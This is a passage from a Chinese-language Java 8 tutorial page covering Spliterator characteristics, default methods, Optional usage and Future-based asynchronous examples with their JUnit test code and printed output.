    <span class="token keyword">int</span> <span class="token function">characteristics</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="拆分过程">拆分过程</h3>
<p>递归过程。框架不断对Spliterator调用trySplit直到它返回null,表明它处理的数据结构不能再分割。</p>
<h3 id="Spliterator-的特性">Spliterator 的特性</h3>
<table>
<thead>
<tr>
<th style="text-align:center"><strong>特性</strong></th>
<th style="text-align:center"><strong>含义</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">ORDERED</td>
<td style="text-align:center">元素有既定的顺序(例如 List ),因此 Spliterator 在遍历和划分时也会遵循这一顺序</td>
</tr>
<tr>
<td style="text-align:center">DISTINCT</td>
<td style="text-align:center">对于任意一对遍历过的元素 x 和 y , x.equals(y) 返回 false</td>
</tr>
<tr>
<td style="text-align:center">SORTED</td>
<td style="text-align:center">遍历的元素按照一个预定义的顺序排序</td>
</tr>
<tr>
<td style="text-align:center">SIZED</td>
<td style="text-align:center">该 Spliterator 由一个已知大小的源建立(例如 Set ),因此 estimatedSize() 返回的是准确值</td>
</tr>
<tr>
<td style="text-align:center">NONNULL</td>
<td style="text-align:center">保证遍历的元素不会为 null</td>
</tr>
<tr>
<td style="text-align:center">IMMUTABL</td>
<td style="text-align:center">Spliterator 的数据源不能修改。这意味着在遍历时不能添加、删除或修改任何元素E</td>
</tr>
<tr>
<td style="text-align:center">CONCURRENT</td>
<td style="text-align:center">该 Spliterator 的数据源可以被其他线程同时修改而无需同步</td>
</tr>
<tr>
<td style="text-align:center">SUBSIZED</td>
<td style="text-align:center">该 Spliterator 和所有从它拆分出来的 Spliterator 都是 SIZED</td>
</tr>
</tbody>
</table>
<h3 id="各个函数及作用">各个函数及作用</h3>
<table>
<thead>
<tr>
<th style="text-align:center">函数名</th>
<th style="text-align:center">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">tryAdvance</td>
<td style="text-align:center">执行一个操作给传入的元素，并且返回一个boolean，来表示是否有剩余元素需要处理</td>
</tr>
<tr>
<td style="text-align:center">trySplit</td>
<td style="text-align:center">最重要的函数，如果数据可以继续分割，返回一个Spliterator，否则返回null</td>
</tr>
<tr>
<td style="text-align:center">estimateSize</td>
<td style="text-align:center">返回一个对剩余元素数量的估值</td>
</tr>
<tr>
<td style="text-align:center">characteristics</td>
<td style="text-align:center">设置Spliterator的某些特性，参考上表。</td>
</tr>
</tbody>
</table>
<h1>默认方法</h1>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Sized</span> <span class="token punctuation">{</span>
    <span class="token keyword">int</span> <span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">default</span> <span class="token keyword">boolean</span> <span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这样任何一个实现了Sized接口的类都会自动继承isEmpty的实现。因此，向提供了默认实 现的接口添加方法就不是源码兼容的。</p>
<p>☀️ 关于继承的一些错误观点</p>
<p>继承不应该成为你一谈到代码复用就试图倚靠的万精油。比如，从一个拥有100个方法及 字段的类进行<br>
继承就不是个好主意，因为这其实会引入不必要的复杂性。你完全可以使用代理 有效地规避这种窘境，即创建一个方法通过该类的成员变量直接调用该类的方法。这就是为什 么有的时候我们发现有些类被刻意地声明为final类型：<strong>声明为final的类不能被其他的类继 承</strong>，避免发生这样的反模式，防止核心代码的功能被污染。注意，有的时候声明为final的类 都会有其不同的原因，比如，String类被声明为final，因为我们不希望有人对这样的核心 功能产生干扰。</p>
<p>这种思想同样也适用于使用默认方法的接口。通过精简的接口，你能获得最有效的组合， 因为你可以只选择你需要的实现。</p>
<h2 id="多来源继承调用默认方法原则">多来源继承调用默认方法原则</h2>
<p>(1) 类中的方法优先级最高。类或父类中声明的方法的优先级高于任何声明为默认方法的优 先级。<br>
(2) 如果无法依据第一条进行判断，那么子接口的优先级更高：函数签名相同时，优先选择 拥有最具体实现的默认方法的接口，即如果B继承了A，那么B就比A更加具体。<br>
(3) 最后，如果还是无法判断，继承了多个接口的类必须通过显式覆盖和调用期望的方法，显式地选择使用哪一个默认方法的实现。</p>
<h1>用Optional取代null</h1>
<h2 id="创建-Optional-对象">创建 Optional 对象</h2>
<ol>
<li>声明一个空的Optional</li>
</ol>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Optional</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Car</span><span class="token punctuation">&gt;</span></span> optCar <span class="token operator">=</span> <span class="token class-name">Optional</span><span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<ol start="2">
<li>依据一个非空值创建Optional</li>
</ol>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Optional</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Car</span><span class="token punctuation">&gt;</span></span> optCar <span class="token operator">=</span> <span class="token class-name">Optional</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span>car<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<ol start="3">
<li>可接受null的Optional<br>
最后，使用静态工厂方法Optional.ofNullable，你可以创建一个允许null值的Optional 对象：</li>
</ol>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Optional</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Car</span><span class="token punctuation">&gt;</span></span> optCar <span class="token operator">=</span> <span class="token class-name">Optional</span><span class="token punctuation">.</span><span class="token function">ofNullable</span><span class="token punctuation">(</span>car<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="使用-map-从-Optional-对象中提取和转换值">使用 map 从 Optional 对象中提取和转换值</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Optional</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Insurance</span><span class="token punctuation">&gt;</span></span> optInsurance <span class="token operator">=</span> <span class="token class-name">Optional</span><span class="token punctuation">.</span><span class="token function">ofNullable</span><span class="token punctuation">(</span>insurance<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">Optional</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> name <span class="token operator">=</span> optInsurance<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token class-name">Insurance</span><span class="token operator">::</span><span class="token function">getName</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h2 id="使用-flatMap-链接-Optional-对象">使用 flatMap 链接 Optional 对象</h2>
<h3 id="原因">原因</h3>
<p>使用 map 从 Optional 对象中提取和转换值，遭遇嵌套式的Optional结构</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Optional</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Person</span><span class="token punctuation">&gt;</span></span> optPerson <span class="token operator">=</span> <span class="token class-name">Optional</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span>person<span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token class-name">Optional</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> name <span class="token operator">=</span> optPerson<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token class-name">Person</span><span class="token operator">::</span><span class="token function">getCar</span><span class="token punctuation">)</span> <span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token class-name">Car</span><span class="token operator">::</span><span class="token function">getInsurance</span><span class="token punctuation">)</span> <span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token class-name">Insurance</span><span class="token operator">::</span><span class="token function">getName</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h3 id="处理">处理</h3>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getCarInsuranceName</span><span class="token punctuation">(</span><span class="token class-name">Optional</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Person</span><span class="token punctuation">&gt;</span></span> person<span class="token punctuation">)</span> <span class="token punctuation">{</span> 
	<span class="token keyword">return</span> person<span class="token punctuation">.</span><span class="token function">flatMap</span><span class="token punctuation">(</span><span class="token class-name">Person</span><span class="token operator">::</span><span class="token function">getCar</span><span class="token punctuation">)</span>
                          <span class="token punctuation">.</span><span class="token function">flatMap</span><span class="token punctuation">(</span><span class="token class-name">Car</span><span class="token operator">::</span><span class="token function">getInsurance</span><span class="token punctuation">)</span>
                          <span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token class-name">Insurance</span><span class="token operator">::</span><span class="token function">getName</span><span class="token punctuation">)</span>
                          <span class="token punctuation">.</span><span class="token function">orElse</span><span class="token punctuation">(</span><span class="token string">"Unknown"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="Optional类并未实现-Serializable接口">Optional类并未实现 Serializable接口</h2>
<h2 id="默认行为及解引用-Optional-对象">默认行为及解引用 Optional 对象</h2>
<table>
<thead>
<tr>
<th style="text-align:center">方法</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">empty</td>
<td style="text-align:center">返回一个空的 Optional 实例</td>
</tr>
<tr>
<td style="text-align:center">filter</td>
<td style="text-align:center">如果值存在并且满足提供的谓词，就返回包含该值的 Optional 对象；否则返回一个空的 Optional 对象</td>
</tr>
<tr>
<td style="text-align:center">flatMap</td>
<td style="text-align:center">如果值存在，就对该值执行提供的 mapping 函数调用，返回一个 Optional 类型的值，否则就返 回一个空的 Optional对象</td>
</tr>
<tr>
<td style="text-align:center">get</td>
<td style="text-align:center">如果该值存在，将该值用 Optional 封装返回，否则抛出一个 NoSuchElementException 异常</td>
</tr>
<tr>
<td style="text-align:center">ifPresent</td>
<td style="text-align:center">如果值存在，就执行使用该值的方法调用，否则什么也不做</td>
</tr>
<tr>
<td style="text-align:center">isPresent</td>
<td style="text-align:center">如果值存在就返回 true，否则返回 false</td>
</tr>
<tr>
<td style="text-align:center">map</td>
<td style="text-align:center">如果值存在，就对该值执行提供的 mapping 函数调用</td>
</tr>
<tr>
<td style="text-align:center">of</td>
<td style="text-align:center">将指定值用 Optional 封装之后返回，如果该值为 null，则抛出一个 NullPointerException 异常</td>
</tr>
<tr>
<td style="text-align:center">ofNullable</td>
<td style="text-align:center">将指定值用 Optional 封装之后返回，如果该值为 null，则返回一个空的 Optional 对象</td>
</tr>
<tr>
<td style="text-align:center">orElse</td>
<td style="text-align:center">如果有值则将其返回，否则返回一个默认值</td>
</tr>
<tr>
<td style="text-align:center">orElseGet</td>
<td style="text-align:center">如果有值则将其返回，否则返回一个由指定的 Supplier 接口生成的值</td>
</tr>
<tr>
<td style="text-align:center">orElseThrow</td>
<td style="text-align:center">如果有值则将其返回，否则抛出一个由指定的 Supplier 接口生成的异常</td>
</tr>
</tbody>
</table>
<h1>CompletableFuture 组合式异步编程</h1>
<h2 id="Future-接口异步">Future 接口异步</h2>
<p>Future接口在Java 5中被引入，设计初衷是对将来某个时刻会发生的结果进行建模。它建模 了一种异步计算，返回一个执行运算结果的引用，当运算结束后，这个引用被返回给调用方。</p>
<h3 id="模拟1">模拟1</h3>
<ul>
<li>使用Future以异步的方式执行一个耗时的操作</li>
</ul>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>junit<span class="token punctuation">.</span></span><span class="token class-name">Test</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>atomic<span class="token punctuation">.</span></span><span class="token class-name">AtomicBoolean</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>atomic<span class="token punctuation">.</span></span><span class="token class-name">AtomicReference</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FutureInAction</span> <span class="token punctuation">{</span>

    <span class="token keyword">private</span> <span class="token keyword">interface</span> <span class="token class-name">Future</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> <span class="token punctuation">{</span>

        <span class="token class-name">T</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">boolean</span> <span class="token function">isDone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">interface</span> <span class="token class-name">Callable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> <span class="token punctuation">{</span>
        <span class="token class-name">T</span> <span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> <span class="token class-name">Future</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> <span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Callable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> callable<span class="token punctuation">)</span> <span class="token punctuation">{</span>

        <span class="token comment">// 异步返回值</span>
        <span class="token class-name">AtomicReference</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> result <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AtomicReference</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// 异步处理完成</span>
        <span class="token class-name">AtomicBoolean</span> finished <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AtomicBoolean</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Thread</span> thread <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            result<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>callable<span class="token punctuation">.</span><span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            finished<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        thread<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Future</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> future <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Future</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token annotation punctuation">@Override</span>
            <span class="token keyword">public</span> <span class="token class-name">T</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> result<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

            <span class="token annotation punctuation">@Override</span>
            <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isDone</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> finished<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> future<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Test</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">testFuture</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">Future</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> result <span class="token operator">=</span> <span class="token function">invoke</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> <span class="token string">"I am finished."</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> <span class="token string">"Error"</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>result<span class="token punctuation">.</span><span class="token function">isDone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"waitting..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span><span class="token function">isDone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>输出</p>
<pre class="line-numbers language-none"><code class="language-none">null
waitting...
waitting...
waitting...
waitting...
waitting...
waitting...
I am finished.
true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="模拟2">模拟2</h3>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>junit<span class="token punctuation">.</span></span><span class="token class-name">Test</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>atomic<span class="token punctuation">.</span></span><span class="token class-name">LongAccumulator</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FutureInAction2</span> <span class="token punctuation">{</span>

    <span class="token annotation punctuation">@Test</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">testExecutorService</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">ExecutorService</span> executorService <span class="token operator">=</span> <span class="token class-name">Executors</span><span class="token punctuation">.</span><span class="token function">newSingleThreadExecutor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">LongAccumulator</span> longAccumulator <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LongAccumulator</span><span class="token punctuation">(</span><span class="token class-name">Long</span><span class="token operator">::</span><span class="token function">sum</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Future</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> result <span class="token operator">=</span> executorService<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">int</span> begin <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token keyword">while</span> <span class="token punctuation">(</span>begin <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                longAccumulator<span class="token punctuation">.</span><span class="token function">accumulate</span><span class="token punctuation">(</span>begin<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">return</span> <span class="token string">"I am finished."</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//        // 阻塞等待执行结果</span>
<span class="token comment">//        result.get();</span>
<span class="token comment">//        System.out.println("result..." + longAccumulator.get());</span>

<span class="token comment">//        //最多等待10秒, 超时未执行完成，报错</span>
<span class="token comment">//        try {</span>
<span class="token comment">//            result.get(10, TimeUnit.SECONDS);</span>
<span class="token comment">//            System.out.println("result..." + longAccumulator.get());</span>
<span class="token comment">//        } catch (Exception e) {</span>
<span class="token comment">//            // java.util.concurrent.TimeoutException</span>
<span class="token comment">//            e.printStackTrace();</span>
<span class="token comment">//        }</span>

        <span class="token comment">// 阻塞等待执行结果</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>result<span class="token punctuation">.</span><span class="token function">isDone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"running"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>result<span class="token punctuation">.</span><span class="token function">isDone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"result..."</span> <span class="token operator">+</span> longAccumulator<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        executorService<span class="token punctuation">.</span><span class="token function">shutdown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>输出</p>
<pre class="line-numbers language-none"><code class="language-none">running.................................................................................................pool-1-thread-1
...................................................+
...................................................................................................+
................................................................................................................................................................................................................................................+
..................................................................................................................................................................+
.........................................................................................................+
..............................................................................................................................................................................................................+
..........................................................................................................................................................+
.......................................................................................................................................................+
...............................+
....................................................................................................................................................................................................
result...45<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="模拟3">模拟3</h3>
<p>将阻塞等待完成后调用程序</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>atomic<span class="token punctuation">.</span></span><span class="token class-name">AtomicBoolean</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>atomic<span class="token punctuation">.</span></span><span class="token class-name">AtomicReference</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">FutureInAction3</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token keyword">interface</span> <span class="token class-name">Callable</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> <span class="token punctuation">{</span>
        <span class="token class-name">T</span> <span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

